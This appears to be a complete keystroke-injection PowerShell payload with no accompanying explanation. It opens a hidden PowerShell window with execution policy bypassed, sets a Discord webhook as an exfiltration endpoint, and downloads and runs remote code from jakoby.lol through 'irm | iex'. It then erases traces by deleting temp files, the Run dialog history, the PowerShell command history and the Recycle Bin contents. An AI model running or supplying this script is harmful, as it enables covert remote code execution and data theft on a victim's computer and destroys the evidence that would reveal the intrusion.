powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1156889045926936596/jJZYEKagDrh_AmJRdlQsmXE8EifRf87Dj3_PMd--fcftcsk8sQbBhkOerOD2P2vUpNok';irm jakoby.lol/e8v | iex
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue